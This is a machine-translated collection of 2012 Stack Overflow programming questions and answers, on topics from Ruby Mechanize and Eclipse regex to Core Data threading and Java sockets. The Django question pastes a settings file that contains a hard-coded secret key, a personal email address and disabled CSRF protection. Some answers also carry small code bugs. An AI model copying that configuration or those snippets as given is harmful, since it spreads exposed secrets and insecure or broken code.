第 II 部分您传递给 :href 的值默认必须完全匹配。因此，您示例中的 href 只会匹配`<a href="/something"></a>`而不匹配`<a href="foo.com/something/a"></a>`

您要做的是传入一个正则表达式，以便它匹配 href 字段中的子字符串。像这样：

```
page = agent.get('http://foo.com/').links_with(:href => %r{/something/}) 
```

**编辑：** 第一部分为了让它只在链接中选择链接，在你的字符串中添加一个 nokogiri 风格的搜索方法。像这样：

```
page = agent.get('http://foo.com/').search("div#content").links_with(:href => %r{/something/})    # ** 
```

好的，这不起作用，因为在您`page = agent.get('http://foo.com/').search("div#content")`返回 Nokogiri 对象而不是机械化对象之后，因此 links_with 将不起作用。但是，您将能够使用 css 方法从 Nokogiri 对象中提取链接。我会建议类似：

`page = agent.get('http://foo.com/').search("div#content").css("a")`

如果这不起作用，我建议查看[http://nokogiri.org/tutorials](http://nokogiri.org/tutorials)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T01:34:55.443

第n个链接：

```
page.links[n-1] 
```

前5个链接：

```
page.links[0..4] 
```

href 中带有“某物”的链接：

```
page.links_with :href => /something/ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T08:57:28.893

您可以使用 nokogiri 节点获得机械化链接。请参阅[links() 方法的源代码。](http://mechanize.rubyforge.org/Mechanize/Page.html)

```
# File lib/mechanize/page.rb, line 352
def links
  @links ||= %w{ a area }.map do |tag|
    search(tag).map do |node|
      Link.new(node, @mech, self)
    end
  end.flatten
end 
```

所以这意味着：

```
the_links= page.search("valid_selector").map do |node|
  Mechanize::Page::Link.new(node, agent, page)
end 
```

这将为您提供有用的 href、text 和 uri 方法。

# regex - 在 Eclipse 中更改命名方案

> ID：10499307
> 
> 赞同：1
> 
> 时间：2012-05-08T13:11:20.477
> 
> 标签：regex, eclipse, naming-conventions, eclipse-cdt

有没有办法在 Eclipse（特别是 Eclipse CDT）中更改变量的命名约定？例如，我可以搜索并替换名称为need_foo 的变量并将其更改为NeedFoo 吗？

显然，添加和删除下划线很容易，但我看不到改变大小写的方法。Perl 的正则表达式对大写和小写字符具有`\u`和`\l`修饰符，但 Eclipse 显然没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T23:57:56.027

在 CDT 中没有自动批量重命名多个不符合要求的函数名称的方法。但是，有一个代码分析规则，旨在指出这些事情。[它使用在线帮助中描述的](http://www.eclipse.org/tptp/home/downloads/installguide/gla_42/ref/rregexp.html)Eclipse Regex 。这些将在您的问题视图中为您提供“信息”级别标记。

它们的工作方式是将正则表达式与每个函数名称匹配，如果不返回匹配项，则会引发错误/警告/信息。您可以通过“Window->Preferences->C/C++->Code Analysis”访问它们。它大约位于滚动列表的一半（在 Eclipse Indigo 中）。

要直接回答您的第二段，Eclipse 没有等效于 Perl 的`\u`and `\l`，它最接近的是 (?ismd-ismd)，它允许您打开基于大小写的*匹配。*

根据代码分析工具是否返回 5 或 50,000 个错误：

**只需重命名几个函数定义**

您可以使用标准的重构重命名工具。右键单击函数名称，“重构->重命名”将用您的新函数名称替换对该函数的所有引用（尊重不同的范围）。

**许多许多错误**

这……不是很好。鉴于没有内置方法，您需要在外部进行。我采取的第一种方法是看看是否有一个现有的插件可以做到这一点。

如果做不到这一点，您也许可以做的是使用代码分析工具来识别不符合要求的函数名称，然后将其输出用作自定义 Perl 脚本的输入？您可以分几个阶段完成：

```
void FooBar(void) {}
int main(int argc, char *argv[])
{
    FooBar();
    return 0;
} 
```

1) 运行代码分析，将警告复制并粘贴到文本文件中：

```
Bad function name "FooBar" (pattern /^(?-i:([a-z]+_[A-Z])|[a-z])(?i:[a-z]*)\z/) main.c  /TestMultiThread    line 47 Code Analysis Problem 
```

2) 更改函数定义`fooBar()`--> `FooBar()`，使用上述错误作为 perl 脚本的输入（注意您有严重不符合要求的函数名称、文件名和行号）。

3）编译它，然后使用编译器的输出`undefined reference to fooBar()`来重命名任何引用：

```
undefined reference to `FooBar' main.c  /TestMultiThread    line 50 C/C++ Problem 
```

这种方法会有一些缺点，例如由于编译“提前”终止，编译器会给出未定义引用的部分列表，在这种情况下，您需要多次运行它。

另一件事是重构脚本（重构 --> 应用脚本），但从我所见的一点点来看，我认为它不会做你想做的事。

总而言之，我发现 Eclipse CDT 中的重构工具远没有 Java 中的重构工具强大（据我记忆）。不过仍然比记事本中的好（而且，不是抨击 CDT，它是一个很棒的开发环境！）

# javascript - 计算数字并一次输出一个字符

> ID：10499315
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:11:44.130
> 
> 标签：javascript, jquery, html

我已经很努力了，但我就是想不通。

我想输出数字，但一次只能输出数字的一个字符。我需要创建这样的东西：

这应该在 for 循环中创建：http: [//jsfiddle.net/jv7H8/](http://jsfiddle.net/jv7H8/)

但正如您所见，当数字 > 10 时，单元格中有多个字符。

期望的结果应该是例如：

1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 1, 1, 1, 2, 1, 3, 1, 4....

有什么建议么？:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:17:54.607

首先将数字连接成一个字符串：

```
var s = '';
for (var i = 1; i <= 42; i++) s += i.toString(); 
```

然后循环字符串中的字符：

```
for (var i = 0; i < s.length; i++) {
  // output s[i]
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:20:52.693

这是用我的方法更新的 jsfiddle：http: [//jsfiddle.net/jv7H8/2/](http://jsfiddle.net/jv7H8/2/)

我更改的相关方面是添加一个 for 循环，该循环通过您要输出的数字的长度进行处理：

```
var str = number.toString(); // the current number as you're looping through
for (var k = 0; k < str.length; k++) {
    var oneLetterAtATime = str.charAt(k); // get the digits one at a time
    output += "<td>" + oneLetterAtATime + "</td>";
}
number++; 
```

**编辑：**如果您只需要 19 列，那么您需要为每个显示另一个`<td>`但不循环返回以增加列计数器的实例更新列计数器。IE，

```
if (k > 0) {
    j++;
} 
```

这是一个更新版本，显示了它是如何工作的：http: [//jsfiddle.net/jv7H8/21/](http://jsfiddle.net/jv7H8/21/)

值得注意的是，当您在第 19 列中显示超过一位数的数字时，没有一种很好的方法可以不超过第 19 列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:23:23.917

获取字符串中的所有字符，如下所示：

```
var t = '';
var limit=100;
for (var j = 1; j<= limit; j++) t += j.toString();

var output='';
for (var j = 0; j < t.length; j++) {
  output=output+','+t[i];
}
alert(output); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:30:43.943

[请在此处](http://jsfiddle.net/jv7H8/22/)检查您更新的小提琴

这将达到您的目的。

以下是代码，其中大部分只是您的代码：

```
rows = 3;
columns = 19;
number = 1;
var str = "";
output = '<table style="width:100%;">';
for(var i = 0; i < rows; i++) {
    output += "<tr>";
    for(var j = 0; j < columns; j++) {
        output += "<td>" + number + "</td>";
        str +=number;
        number++;
    }
    output += "</tr>";
}
output += "</table>";
$("#game").html(output);

var strvalue="";

$.each(str, function(e,v){
    if (e > 0){
        strvalue = strvalue + ", "+ v;
    }
    else{
    strvalue += v;
    }
});

alert(strvalue); 
```

# c# - 正确的 jQuery 代码在 webdriver 中不起作用

> ID：10499316
> 
> 赞同：0
> 
> 时间：2012-05-08T13:11:45.450
> 
> 标签：c#, jquery, selenium, webdriver

我正在将我们的 Selenium 测试迁移到 WebDriver，并且有一个测试使用 jQuery 来确定某个位置有多少元素。此代码在 Selenium1 上运行良好，但不适用于 WebDriver。当我说“它不工作”时，我的意思是它返回一个非常大且丑陋的*null*而不是所需的 3 作为字符串。但是，如果我使用 Selenium1 运行它，我会得到所需的 3 作为字符串。

我用谷歌搜索，但我没有找到任何可以帮助解决这个问题的东西。

这些示例不是真正的代码，它们只是示例。如果我在 firebug 中运行原始代码，它总是可以正常工作。

html代码：

```
<div id='listOfElements'>
  <div class='items'>
    <ul class='items'>
        <li class='listedElements'>elem 1</li>
        <li class='listedElements'>elem 2</li>
        <li class='listedElements'>elem 3</li>
        <li class='listedElements'>elem 4</li>
    </ul>
  </div>
</div> 
```

javascript代码：

```
window.$("div[id='listOfElements']>div[class='items']>ul[class='items'] li[class*='listedElements']").length 
```

C#代码：

```
public string GetEval(string script)
{
        var js = _driver as IJavaScriptExecutor;
        return (string) js.ExecuteScript(script);
} 
```

此方法始终返回 null，但是我需要“listeElements”的数量。

版本：c# 3.5

Webdriver：根据我的文件系统，我是在今年三月初左右下载的，不知道如何获得它的修订号。

jQuery：1.6.2

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:06:57.670

我认为你需要返回值，所以如果上面的代码是正确的：

```
return window.$("div[id='listOfElements']>div[class='items']>ul[class='items'] li[class*='listedElements']").length; 
```

您只需将返回部分添加到要执行的字符串的前面。

# css - 扩展 div 以获取剩余宽度，具有良好的源顺序

> ID：10499317
> 
> 赞同：2
> 
> 时间：2012-05-08T13:11:48.913
> 
> 标签：css

这个问题基本上是[Expand div 取剩余宽度](https://stackoverflow.com/questions/1260122/)的一个分支，有一个关键的区别：我希望列具有不同的源和显示顺序。

来源顺序：

```
<div class="view">View</div>
<div class="tree">Tree</div> 
```

显示顺序：

```
------------------
| Tree | View    |
------------------ 
```

限制：

*   `.tree`具有可变宽度的内容；它应该缩小到它的内容，同时`.view`占据剩余的宽度。
*   列也将具有可变高度，因此没有负面`margin-top`欺骗的余地。

JSFiddle：http: [//jsfiddle.net/UrXdw/](http://jsfiddle.net/UrXdw/)

这可以在纯CSS中做到吗？目标浏览器是现代浏览器和 IE8+。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T16:12:46.427

我不确定为什么左栏是灵活的，但在这种情况下，我认为如果没有 javascript，你不会有任何运气。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-10T19:21:08.997

我尝试了几种方法来解决这个问题，我的结论是这是**不可能的**。

# php - 用于检测和替换带有锚标记的文本链接的 php 正则表达式

> ID：10499318
> 
> 赞同：0
> 
> 时间：2012-05-08T13:11:48.943
> 
> 标签：php, regex, for-loop, hyperlink

我从网站论坛上得到了这个正则表达式来查找文本中的链接并将它们替换为 html 链接，以便它们可以点击。

当有人输入如下所示的新 youtube 链接之一时，问题就出现了：

[http://youtu.be/djKd189-ag2](http://youtu.be/djKd189-ag2)

发生的情况是链接由破折号组成，然后 -ag2 自行保留。

我对 php 正则表达式的了解还不够，甚至不敢更改它以添加解析破折号，所以我希望能得到一些帮助：

```
$newText = preg_replace('@((http|https)://([\w-.]+)+(:\d+)?(/([\w/_.]*(\?\S+)?)?)?)@', 
             '<a href="$1" class="link1" target="_blank">$1</a>',$text); 
```

我猜它在 \S+ 部分附近

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:15:39.050

```
$newText = preg_replace('@((http|https)://([\w-.]+)+(:\d+)?(/([\w/_-.]*(\?\S+)?)?)?)@', 
             '<a href="$1" class="link1" target="_blank">$1</a>',$text); 
```

你只需要一个 '-' 写成 '[\w/_.]'

# java - 什么是弱全局引用？它与全球参考有何不同？

> ID：10499320
> 
> 赞同：6
> 
> 时间：2012-05-08T13:12:04.873
> 
> 标签：java, c, java-native-interface, weak-references

JNI中的*弱全局引用是什么？*它与*全局参考*和*本地参考*有何不同？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:52:26.820

我认为您的问题的答案可以在这里找到：http: [//java.sun.com/docs/books/jni/html/refs.html](http://java.sun.com/docs/books/jni/html/refs.html)

正如其所写：

> 本地和全局引用具有不同的生命周期。局部引用被自动释放，而全局和弱全局引用在程序员释放之前保持有效。

局部引用和全局引用的区别在于：上下文

本地引用只是一个局部变量。一旦您离开其上下文（例如从定义它的本机函数返回），底层对象将被销毁。

> 与全局引用一样，弱全局引用在本地方法调用和不同线程中仍然有效。与全局引用不同，弱全局引用不会阻止底层对象被垃圾收集。

弱全局引用和全局引用之间的区别在于，弱引用引用的对象可以在需要时进行垃圾回收（以防内存不足）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-08T13:17:39.893

如果一个对象只有*弱引用*，gc 可以将其从内存中清除。

*软引用*是指当它也想清除对象时不会阻止 gc 的引用。但是如果一个对象被软引用引用，那么 gc 会尽可能地将该对象保留在内存中。

# ruby-on-rails - 在 Rails 中显示来自 Sunspot 的搜索结果

> ID：10499321
> 
> 赞同：0
> 
> 时间：2012-05-08T13:12:08.710
> 
> 标签：ruby-on-rails, view, sunspot

我已经设法（通过这个论坛）搜索了多个带有太阳黑子的模型。现在我被困在如何以预期的方式显示结果。

这是我的控制器中的内容

```
@search = Sunspot.search [Gear, User] do
        fulltext params[:search]
        paginate(page: params[:page])
end

@gears = @search.results 
```

所以在我添加 User 模型之前，我会遍历每个 Gear 对象，如下所示：

```
<% @gears.each do |gear| %>
<%= link_to gear_path(gear) do %>
<div class="gear_list_box">
    <div class="gear_list_box_top"><%= image_tag gear.image_url(:list), class: 'gear_list_box_top_pic' %></div>
    <div class="gear_list_box_bottom">
        <table style="border-collapse:collapse; cellspacing: 0; width: 100%; margin: 0;" >
            <tr>
                <td style="color: #2c6aa7; padding-left: 10px" width="60%"> <span class='gearlist_size'><%= gear.size %></span> - <%=  truncate(gear.title,:length => 12) %></td>
                <td rowspan="2" width="40%" style="color: #5c8d0d; text-align: center; vertical-align: middle; font-size: 120%; border-collapse:collapse;">$<%= gear.price %>/day</td>
            </tr>
            <tr>
                <td width="60%" style="padding-left: 10px; font-size: 12px;"><%= gear.user.first_name + " " + gear.user.last_name%></td>
            </tr>
        </table>
    </div>
</div>
<% end %>
<% end %> 
```

现在它通过类似于以下的错误：

```
NoMethodError in Gears#index

Showing /Users/dave/rails_projects/outdoor/app/views/gears/_gear.html.erb where line #3 raised:

undefined method `image_url' for #<User:0x007fd6654cae08> 
```

因为 User 对象显然没有与 Gear 对象相同的列。如何正确显示此内容并仍按用户名搜索？

模型是 Gear:belongs_to User:has_many

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:01:35.427

我最好做这样的事情：

```
@search = Gear.solr_search do
        fulltext params[:search]
        paginate(page: params[:page])
end

@gears = @search.results 
```

在齿轮模型中：

```
searchable do
    ...
    text :user_name do
      user.name
    end
end 
```

# c# - 在 C# 中的枚举值之间迭代

> ID：10499325
> 
> 赞同：12
> 
> 时间：2012-05-08T13:12:23.707
> 
> 标签：c#, enumeration

> **可能重复：**
> [如何枚举枚举？](https://stackoverflow.com/questions/105372/how-to-enumerate-an-enum)

假设我有一个这样的枚举：

```
public enum Cars
{
    Audi = 0,
    BMW,
    Opel,
    Renault,
    Fiat,
    Citroen,
    AlfaRomeo,
} 
```

我有机会在欧宝和雪铁龙之间迭代吗？我想将这些值作为方法的参数。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-08T13:17:11.523

这将起作用：

```
for(Cars car=Cars.Opel; car<=Cars.Citroen; car++)
{
  Console.WriteLine(car);
} 
```

但您必须确保起始值小于结束值。

**编辑**
如果您不对开始和结束进行硬编码，而是将它们作为参数提供，则需要以正确的顺序使用它们。如果你只是切换“欧宝”和“雪铁龙”，你将没有输出。

此外（如评论中所述）基础整数值不得包含间隙或重叠。幸运的是，如果您自己不指定值（甚至不需要 '=0'），这将是默认行为。见[MSDN](http://msdn.microsoft.com/en-us/library/cc138362.aspx)：

> 当您没有为枚举器列表中的元素指定值时，这些值会自动增加 1。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:14:18.400

您可以使用以下代码循环遍历枚举：

```
string[] names = Enum.GetNames(typeof(Cars));
Cars[] values = (MyEnum[])Enum.GetValues(typeof(Cars));

for( int i = 0; i < names.Length; i++ )
{
    print(names[i], values[i]);
} 
```

如果您知道要从 Opel 开始并转到 Citroen，则将 的开始值和结束值设置为`i`数组中的正确索引。

看起来像这样：

```
 string[] names = Enum.GetNames(typeof(Cars));
  Cars[] values = (Cars[])Enum.GetValues(typeof(Cars));

  int start = names.ToList().IndexOf("Opel");
  int end = names.ToList().IndexOf("Citroen") + 1;

  for (int i = start; i < end; i++)
  {
      Console.WriteLine(names[i] + ' ' + values[i]);
  } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:21:17.740

此外，使用 LINQ：

```
var values = (from e in Enum.GetValues(typeof(Cars)) as Cars[]
              where e >= Cars.Opel && e <= Cars.Citroen
              select e);
// the same as above, but using lambda expressions
// var values = (Enum.GetValues(typeof(Cars)) as Cars[]).Where(car => car >= Cars.Opel && car <= Cars.Citroen); 

foreach(Cars c in values) Console.WriteLine(c); 
```

# objective-c - 核心数据和多线程在保存时崩溃

> ID：10499331
> 
> 赞同：2
> 
> 时间：2012-05-08T13:12:43.877
> 
> 标签：objective-c, multithreading, core-data, grand-central-dispatch

我正在构建一个从远程服务器提取数据并将它们存储在 CoreData SQLite 数据库中的应用程序。我正在从后台线程获取数据，而主线程正在使用它。以下是我正在使用的主要方法。

1.  所有后台线程都有自己的`NSManagedObjectContext`.
2.  `persistentStoreCoordinator`是在上下文之间共享的。
3.  在后台线程的每次提取中，我保存：插入的对象并重置：本地上下文。
4.  使用通知我与主线程上下文进行合并。

我遇到的问题：

*   随机我`NSZombie`在后台线程保存时遇到没有消息的崩溃（并且设置了崩溃断点）：操作。
*   有很多重复的数据正在生成。网络服务数据肯定没问题，所以服务器端没有问题。

这里是代码。

**AppDelegate**

```
- (void)applicationDidBecomeActive:(UIApplication *)application
{
    // Update data from remote server
    WebserviceDataModel *webservice = [[WebserviceDataModel alloc] init];
    webservice.managedObjectContext = self.managedObjectContext;
    [webservice startImport];
} 
```

**后台线程在 WebserviceDataModel 上获取和保存数据**

```
- (void)startImport
{
    dispatch_queue_t downloadQueue = dispatch_queue_create("startImport in WebserviceDataModel", NULL);
    dispatch_async(downloadQueue, ^{
        NSManagedObjectContext *moc = [[NSManagedObjectContext alloc] init];
        moc.persistentStoreCoordinator = self.managedObjectContext.persistentStoreCoordinator;

        // get the remote data
        NSDictionary *lojas = [Loja allLojasFromRemoteServer];

        for (NSDictionary *lojaInfo in lojas) {
            Loja *loja __attribute__((unused)) = [Loja lojaWithRemoteData:lojaInfo inManagedObjectContext:moc];
        }

        if ([moc hasChanges]) {
            [moc save:nil];
            [moc reset];
        }
        [moc release];        

    });
    dispatch_release(downloadQueue);
} 
```

**用于创建对象的 NSManagedObject 方法：`+ (Loja *)lojaWithRemoteData:inManagedContext:`**

```
+ (Loja *)lojaWithRemoteData:(NSDictionary *)remoteData inManagedObjectContext:(NSManagedObjectContext *)context
{
    Loja *loja = nil;

NSFetchRequest *request = [[NSFetchRequest alloc] init];
request.entity = [NSEntityDescription entityForName:@"Loja" inManagedObjectContext:context];
request.predicate = [NSPredicate predicateWithFormat:@"lojaId = %d", [[remoteData objectForKey:@"lojaId"] intValue]];

NSError *error = nil;
loja = [[context executeFetchRequest:request error:&error] lastObject];
[request release];

if (!error && !loja) {
        // create the record
        loja = [NSEntityDescription insertNewObjectForEntityForName:@"Loja" inManagedObjectContext:context];

        loja.lojaId = [remoteData objectForKey:@"lojaId"];
        loja.email = [remoteData objectForKey:@"email"];
        loja.facebook = [remoteData objectForKey:@"facebook"];
        // ... and others...
    }

    return loja;
} 
```

**订阅 WebserviceDataModel 上的 NSManagedObjectContextDidSaveNotification**

```
- (id)init
{
    self = [super init];
    if (self) {
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(contextChanged:) name:NSManagedObjectContextDidSaveNotification object:nil];
    }
    return self;
} 
```

**WebserviceDataModel 上的 contextChanged: 方法**

```
- (void)contextChanged:(NSNotification*)notification
{
    if ([notification object] == self.managedObjectContext) return;

    if (![NSThread isMainThread]) {
        [self performSelectorOnMainThread:@selector(contextChanged:) withObject:notification waitUntilDone:YES];
        return;
    }
    [[self managedObjectContext] mergeChangesFromContextDidSaveNotification:notification];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T16:51:16.647

好吧，我已经想通了。它现在就像一个魅力。多线程上下文的实现是正确的。问题在于`applicationDidBecomeActive:`我的应用程序使用 CoreLocation Fence 来获取功能列表。当应用程序第一次启动时，CoreLocation 框架会向用户显示一条警报消息，指出该应用程序使用用户位置...该警报`applicationDidBecomeActive:`再次调用，创建两个并发更新波。只需将我的 WebserviceDataModel 移动到一个属性并实现一个标志以了解它是否正在运行。而已

只是为了最后的改进，将合并策略更改为`NSMergeByPropertyStoreTrumpMergePolicy`，所以现在服务器端数据（在内存中）胜过本地存储。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T15:27:28.487

如果没有细节，很难理解发生了什么。

说到这里，首先尝试设置断点，并按照应用程序流程。也许你可以找到你的应用程序崩溃的地方。

那么，你确定这`lojaId`是一个标量值吗？当您创建一个新实体时，您编写了以下内容：

```
loja.lojaId = [remoteData objectForKey:@"lojaId"]; 
```

也许这可能是错误，所以我将尝试以下谓词：

```
[NSPredicate predicateWithFormat:@"lojaId == %@", [remoteData objectForKey:@"lojaId"]]; 
```

最后，当您进行保存时，请尝试记录`NSError`对象。也许您可以找到崩溃的原因。

```
if ([moc hasChanges]) {

    NSError* error = nil;
    [moc save:&error];

    if(error) {

        NSLog(@"Error during save: %@\n%@", [error localizedDescription], [error userInfo]);
        abort(); // only for debug purposes
    }
    [moc reset];
} 
```

希望能帮助到你。

# iphone - 创建一个 NSError 域

> ID：10499333
> 
> 赞同：1
> 
> 时间：2012-05-08T13:12:45.670
> 
> 标签：iphone, ios, nserror

我想为我的应用程序创建一个自定义错误域。我有一个枚举`NSInteger`类型，涵盖了我可以获得的所有可能的错误代码，我的问题是如何将这些与我的自定义域相关联？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:21:41.470

您的域只是一个命名它的字符串。您无需在任何地方注册。

在带有错误代码的标题中，添加以下行：

```
extern NSString *const MyErrorDomain; 
```

在你的实现文件中：

```
NSString *const MyErrorDomain = @"MyErrorDomain"; 
```

然后，您可以将该命名常量用于您的错误域。完毕！

# python - 发生服务器错误。请联系管理员

> ID：10499336
> 
> 赞同：0
> 
> 时间：2012-05-08T13:12:52.457
> 
> 标签：python, django

> **可能重复：**
> [配置不当：中间件模块“django.middleware.csrf”未定义“CsrfResponseMiddleware”类](https://stackoverflow.com/questions/8953783/improperlyconfigured-middleware-module-django-middleware-csrf-does-not-define)

我在运行 django 应用程序时收到上述消息。我把调试设置为真，但我得到的不是标准的 django 错误

```
A server error occurred.  Please contact the administrator.

# Django settings for mysite1 project.
import os.path 

DEBUG = True
TEMPLATE_DEBUG = DEBUG

ADMINS = (
    ('rohit', 'rohitdwivedi51@gmail.com'),
)

MANAGERS = ADMINS

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': '/home/rohitd/workspace/slm_uidatabase.db',                      # Or path to database file if using sqlite3.
        'USER': '',                      # Not used with sqlite3.
        'PASSWORD': '',                  # Not used with sqlite3.
        'HOST': '',                      # Set to empty string for localhost. Not used with sqlite3.
        'PORT': '',                      # Set to empty string for default. Not used with sqlite3.
    }
}

# Local time zone for this installation. Choices can be found here:
# http://en.wikipedia.org/wiki/List_of_tz_zones_by_name
# although not all choices may be available on all operating systems.
# On Unix systems, a value of None will cause Django to use the same
# timezone as the operating system.
# If running in a Windows environment this must be set to the same as your
# system time zone.
TIME_ZONE = 'America/Chicago'

# Language code for this installation. All choices can be found here:
# http://www.i18nguy.com/unicode/language-identifiers.html
LANGUAGE_CODE = 'en-us'

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale
USE_L10N = True

# Absolute filesystem path to the directory that will hold user-uploaded files.
# Example: "/home/media/media.lawrence.com/media/"
MEDIA_ROOT = os.path.join(os.path.dirname(__file__), "media") 
# URL that handles the media served from MEDIA_ROOT. Make sure to use a
# trailing slash.
# Examples: "http://media.lawrence.com/media/", "http://example.com/media/"
MEDIA_URL = '/media/'

# Absolute path to the directory static files should be collected to.
# Don't put anything in this directory yourself; store your static files
# in apps' "static/" subdirectories and in STATICFILES_DIRS.
# Example: "/home/media/media.lawrence.com/static/"
STATIC_ROOT = ''

# URL prefix for static files.
# Example: "http://media.lawrence.com/static/"
STATIC_URL = '/static/'

# URL prefix for admin static files -- CSS, JavaScript and images.
# Make sure to use a trailing slash.
# Examples: "http://foo.com/static/admin/", "/static/admin/".
ADMIN_MEDIA_PREFIX = '/static/admin/'

# Additional locations of static files
STATICFILES_DIRS = (
    # Put strings here, like "/home/html/static" or "C:/www/django/static".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

# List of finder classes that know how to find static files in
# various locations.
STATICFILES_FINDERS = (
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
#    'django.contrib.staticfiles.finders.DefaultStorageFinder',
)

# Make this unique, and don't share it with anybody.
SECRET_KEY = '88^$#do)us^kzil0dtm7$t_0mrppz%p+mskovdq(ww0fi4i9o2'

# List of callables that know how to import templates from various sources.
TEMPLATE_LOADERS = (
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',
#     'django.template.loaders.eggs.Loader',
)

TEMPLATE_CONTEXT_PROCESSORS = ( 
    'django.core.context_processors.csrf', 
) 
MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    #'django.middleware.csrf.CsrfViewMiddleware',
    #This got added to view the post, not suggestable but need to use this.    
    'django.middleware.csrf.CsrfResponseMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
)

ROOT_URLCONF = 'slm_ui.urls'

TEMPLATE_DIRS = (
    # Put strings here, like "/home/html/django_templates" or "C:/www/django/templates".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
    #"/home/deepakt/mysite1/templates/"
    "/home/rohitd/workspace/slm_ui/templates"

    )

INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'slm_ui.dashboard',
    'slm_ui.networking',
    'slm_ui.firewall',
    # Uncomment the next line to enable the admin:
    # 'django.contrib.admin',
    # Uncomment the next line to enable admin documentation:
    # 'django.contrib.admindocs',
)

# A sample logging configuration. The only tangible logging
# performed by this configuration is to send an email to
# the site admins on every HTTP 500 error.
# See http://docs.djangoproject.com/en/dev/topics/logging for
# more details on how to customize your logging configuration.
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'mail_admins': {
            'level': 'ERROR',
            'class': 'django.utils.log.AdminEmailHandler'
        }
    },
    'loggers': {
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': True,
        },
    }
} 
```

我的错误日志在这里............

```
Traceback (most recent call last):
  File "/usr/lib/python2.6/wsgiref/handlers.py", line 93, in run
    self.result = application(self.environ, self.start_response)
  File "/usr/local/lib/python2.6/dist-packages/django/core/handlers/wsgi.py", line 216, in __call__
    self.load_middleware()
  File "/usr/local/lib/python2.6/dist-packages/django/core/handlers/base.py", line 51, in load_middleware
    raise exceptions.ImproperlyConfigured('Middleware module "%s" does not define a "%s" class' % (mw_module, mw_classname))
ImproperlyConfigured: Middleware module "django.middleware.csrf" does not define a "CsrfResponseMiddleware" class 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:17:19.877

当 django 能够运行时，您将收到漂亮的错误消息。在您的情况下，django 无法从模块导入`CsrfResponseMiddleware`类。`django.middleware.csrf`首先在设置中修复此错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T14:27:11.230

尝试在 MIDDLEWARE_CLASSES 块中取消注释以下行：

```
#'django.middleware.csrf.CsrfViewMiddleware', 
```

# html - 如何在一半的网页上添加喷绘渐变？

> ID：10499347
> 
> 赞同：0
> 
> 时间：2012-05-08T13:13:52.550
> 
> 标签：html, css

我只想在我网站主页的上半部分制作背景喷绘渐变。类似于[这个网站](http://taylorstitch.com/)的背景。有人可以通过跨浏览器支持帮助我做到这一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:16:14.763

背景图片：[http ://www.tizag.com/pics/BannerTileBackground.gif](http://www.tizag.com/pics/BannerTileBackground.gif)

```
body {
    background-image: url(http://www.tizag.com/pics/BannerTileBackground.gif);
    background-repeat: repeat-x; 
    background-position: top;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:18:24.327

那是使用 Css 的大背景图像。如果你愿意，你可以简写它。

```
body {
background:url(pathtoyourimage/image.gif) top left repeat-x scroll #fff;
} 
```

# java - 使用java从套接字流中读取多个流？

> ID：10499354
> 
> 赞同：0
> 
> 时间：2012-05-08T13:14:33.313
> 
> 标签：java, multithreading, sockets, stream

有没有办法从打开的套接字流中随机读取字节？假设我在网站中打开了一个数据流。传统的 java 类让我可以顺序访问数据。像一个链表。我想随机读取数据，例如从数组的随机位置读取数据。假设如果数据大小为 2048 KB，我想用 1 个线程从 0 读取到 1204 KB，同时想使用另一个线程从 1205 到 2048 KB 读取数据。

所以底线是我想从网站打开的套接字中对数据读取过程进行多线程处理。该过程必须类似于 Internet 下载管理器。如果可能的话，请给我一些教程链接..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:16:38.820

